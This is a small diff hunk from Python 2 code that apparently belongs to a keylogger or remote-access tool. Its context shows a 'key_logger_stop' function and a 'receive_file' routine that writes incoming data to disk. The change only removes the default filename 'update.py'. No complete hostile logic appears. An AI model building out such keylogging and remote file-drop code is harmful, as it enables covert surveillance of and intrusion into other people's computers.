@@ -41,7 +41,7 @@ def key_logger_stop(params):
     pythoncom.PumpWaitingMessages()
 
 
-def receive_file(params, file="update.py"):
+def receive_file(params, file):
     size_to_read = int(params[0])
     print 'file size = ', size_to_read
     with open(file, 'wb') as f:
